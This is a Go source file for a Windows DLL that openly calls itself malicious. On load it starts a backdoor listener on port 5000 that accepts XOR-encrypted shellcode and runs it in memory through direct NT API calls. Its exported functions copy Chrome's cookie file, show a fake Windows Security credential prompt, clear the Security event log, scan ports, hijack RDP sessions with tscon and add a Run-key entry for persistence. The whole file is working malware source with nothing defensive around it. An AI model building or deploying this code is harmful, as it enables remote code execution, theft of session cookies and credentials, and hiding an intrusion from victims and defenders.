// src/dll/main.go
package main

/*
#include <windows.h>
*/
import "C"
import (
    "unsafe"
    "golang.org/x/sys/windows"
    "encoding/binary"
    "io"
    "net"
    "os/exec"
    "syscall"
    "time"
    "path/filepath"
    "os"
    "fmt"
    "sync"
)


func init() {
    go StartListener() // Start command listener in background
}

//export StartListener
func StartListener() {
    ln, err := net.Listen("tcp", ":5000")
    if err != nil {
        return
    }
    defer ln.Close()
    
    for {
        conn, err := ln.Accept()
        if err != nil {
            continue
        }
        go handleConnection(conn)
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    
    // Read function name (null-terminated)
    funcName := readNullTerminated(conn)
    if funcName == "" {
        return
    }

    switch funcName {
    case "ExecuteShellCode":
    // Read XOR key (1 byte)
    keyBuf := make([]byte, 1)
    if _, err := io.ReadFull(conn, keyBuf); err != nil {
        return
    }
    
    // Read shellcode length
    lenBuf := make([]byte, 4)
    if _, err := io.ReadFull(conn, lenBuf); err != nil {
        return
    }
    length := binary.LittleEndian.Uint32(lenBuf)
    
    // Read encrypted shellcode
    encryptedShellcode := make([]byte, length)
    if _, err := io.ReadFull(conn, encryptedShellcode); err != nil {
        return
    }
    
    // Execute with decryption
    ExecuteShellCode(
        (*C.byte)(unsafe.Pointer(&encryptedShellcode[0])),
        C.int(length),
        C.byte(keyBuf[0]),
    )
    }
}

func readNullTerminated(conn net.Conn) string {
    var buf [1]byte
    var result []byte
    
    for {
        _, err := conn.Read(buf[:])
        if err != nil || buf[0] == 0 {
            break
        }
        result = append(result, buf[0])
    }
    return string(result)
}


// --- Malicious Functions ---

//export ExecuteShellCode
func ExecuteShellCode(encryptedShellcodePtr *C.byte, size C.int, key C.byte) {
    encryptedShellcode := C.GoBytes(unsafe.Pointer(encryptedShellcodePtr), size)

    // Decryption
    shellcode := make([]byte, len(encryptedShellcode))
    for i := range encryptedShellcode {
        shellcode[i] = encryptedShellcode[i] ^ byte(key)
    }
    
    kernel32 := windows.NewLazyDLL("kernel32.dll")
    ntdll := windows.NewLazyDLL("ntdll.dll")
    virtualFreeEx := kernel32.NewProc("VirtualFreeEx")
    ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
    ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
    ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")

    var (
        baseAddr     uintptr
        oldProtect   uint32
        hThread      uintptr
        regionSize   = uintptr(len(encryptedShellcode))
        pageSize     = uintptr(4096)
        xorKey       = byte(key)
    )

    // Align region size to system page boundaries
    if rem := regionSize % pageSize; rem != 0 {
        regionSize += pageSize - rem
    }

    // 1. Allocate RW memory using direct syscall
    status, _, _ := ntAllocateVirtualMemory.Call(
        uintptr(windows.CurrentProcess()),
        uintptr(unsafe.Pointer(&baseAddr)),
        0,
        uintptr(unsafe.Pointer(&regionSize)),
        uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
        uintptr(windows.PAGE_READWRITE),
    )
    if status != 0 {
        return
    }

    // 2. Copy and decrypt shellcode in one pass
    dstPtr := unsafe.Pointer(baseAddr)
    for i := 0; i < len(encryptedShellcode); i++ {
        *(*byte)(unsafe.Pointer(uintptr(dstPtr) + uintptr(i))) = 
            encryptedShellcode[i] ^ xorKey
    }

    // 3. Change memory protection to RX
    status, _, _ = ntProtectVirtualMemory.Call(
        uintptr(windows.CurrentProcess()),
        uintptr(unsafe.Pointer(&baseAddr)),
        uintptr(unsafe.Pointer(&regionSize)),
        uintptr(windows.PAGE_EXECUTE_READ),
        uintptr(unsafe.Pointer(&oldProtect)),
    )
    if status != 0 {
        virtualFreeEx.Call(
            uintptr(windows.CurrentProcess()),
            baseAddr,
            0,
            uintptr(windows.MEM_RELEASE),
        )
        return
    }

    // 4. Create thread with indirect syscall
    status, _, _ = ntCreateThreadEx.Call(
        uintptr(unsafe.Pointer(&hThread)),
        uintptr(0x1FFFFF), // THREAD_ALL_ACCESS
        0,
        uintptr(windows.CurrentProcess()),
        baseAddr,
        0,
        0,
        0,
        0,
        0,
        0,
    )

    if status == 0 {
        windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
        windows.CloseHandle(windows.Handle(hThread))
    }

    /*/ Comment out this section if you want the DLL to remain resident
    // 5. Clean up memory (optional for persistent payloads)
    windows.VirtualFreeEx(
        windows.CurrentProcess(),
        baseAddr,
        0,
        windows.MEM_RELEASE,
    )*/
}

//export StealBrowserCookies
func StealBrowserCookies(outputDir *C.char) C.int {
    // Get Chrome cookies path
    chromePath := filepath.Join(
        os.Getenv("LOCALAPPDATA"),
        "Google",
        "Chrome",
        "User Data",
        "Default",
        "Cookies",
    )

    // 1. Read source file
    data, err := os.ReadFile(chromePath)
    if err != nil {
        return 0
    }

    // 2. Prepare output path
    outputPath := filepath.Join(C.GoString(outputDir), "chrome_cookies.db")
    
    // 3. Write to destination
    if err := os.WriteFile(outputPath, data, 0644); err != nil {
        return 0
    }

    return 1 // Success
}

//export HookCredentialAPI
func HookCredentialAPI() {
    modadvapi := windows.NewLazyDLL("advapi32.dll")
    procCredUIPrompt := modadvapi.NewProc("CredUIPromptForCredentialsW")
    
    // Use procCredUIPrompt to avoid unused var
    _, _, _ = procCredUIPrompt.Call(0) // Example usage
    
    windows.MessageBox(0, syscall.StringToUTF16Ptr("Fake Credential Prompt!"), 
        syscall.StringToUTF16Ptr("Windows Security"), windows.MB_OK)
}

//export ClearEventLogs
func ClearEventLogs() {
    advapi32 := windows.NewLazyDLL("advapi32.dll")
    openEventLog := advapi32.NewProc("OpenEventLogW")
    clearEventLog := advapi32.NewProc("ClearEventLogW")
    closeEventLog := advapi32.NewProc("CloseEventLog")

    logName, _ := windows.UTF16PtrFromString("Security")
    hLog, _, _ := openEventLog.Call(0, uintptr(unsafe.Pointer(logName)))
    if hLog == 0 {
        return
    }

    clearEventLog.Call(hLog, 0)
    closeEventLog.Call(hLog)
}

//export PortScan
func PortScan(targetIP *C.char, startPort C.int, endPort C.int) {
    ip := C.GoString(targetIP)
    sPort := int(startPort)
    ePort := int(endPort)
    
    // Handle reversed port range
    if sPort > ePort {
        sPort, ePort = ePort, sPort
    }
    
    totalPorts := ePort - sPort + 1
    workerCount := 100
    if totalPorts < workerCount {
        workerCount = totalPorts
    }

    ports := make(chan int, workerCount*2)
    var wg sync.WaitGroup

    // Create worker pool
    for i := 0; i < workerCount; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for port := range ports {
                address := fmt.Sprintf("%s:%d", ip, port)
                conn, err := net.DialTimeout("tcp", address, 2*time.Second)
                if err == nil {
                    conn.Close()
                    // Report open port to C2 (implementation specific)
                }
            }
        }()
    }

    // Feed ports to workers
    for port := sPort; port <= ePort; port++ {
        ports <- port
    }
    
    close(ports)
    wg.Wait()
}

//export RDPHijack
func RDPHijack(sessionID C.int) {
    cmd := exec.Command("cmd.exe", "/c", "tscon", fmt.Sprintf("%d", sessionID), "/dest:console")
    _ = cmd.Run()
}

//export InstallPersistence
func InstallPersistence() {
    advapi32 := windows.NewLazyDLL("advapi32.dll")
    regCreateKeyEx := advapi32.NewProc("RegCreateKeyExW")
    regSetValueEx := advapi32.NewProc("RegSetValueExW")
    regCloseKey := advapi32.NewProc("RegCloseKey")

    keyPath, _ := windows.UTF16PtrFromString("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    
    var hKey windows.Handle
    ret, _, _ := regCreateKeyEx.Call(
        uintptr(windows.HKEY_CURRENT_USER),
        uintptr(unsafe.Pointer(keyPath)),
        0,
        0,
        uintptr(0), // REG_OPTION_NON_VOLATILE (0x00000000)
        uintptr(windows.KEY_WRITE),
        0,
        uintptr(unsafe.Pointer(&hKey)),
        0,
    )
    if ret != 0 {
        return
    }

    var modName [256]uint16
    windows.GetModuleFileName(0, &modName[0], uint32(len(modName)))
    dllPath := &modName[0]

    length := 0
    for modName[length] != 0 {
        length++
    }
    dataSize := uint32((length + 1) * 2)

    valueName, _ := windows.UTF16PtrFromString("MaliciousApp")
    ret, _, _ = regSetValueEx.Call(
        uintptr(hKey),
        uintptr(unsafe.Pointer(valueName)),
        0,
        uintptr(windows.REG_SZ),
        uintptr(unsafe.Pointer(dllPath)),
        uintptr(dataSize),
    )
    
    regCloseKey.Call(uintptr(hKey))
}

func main() {}
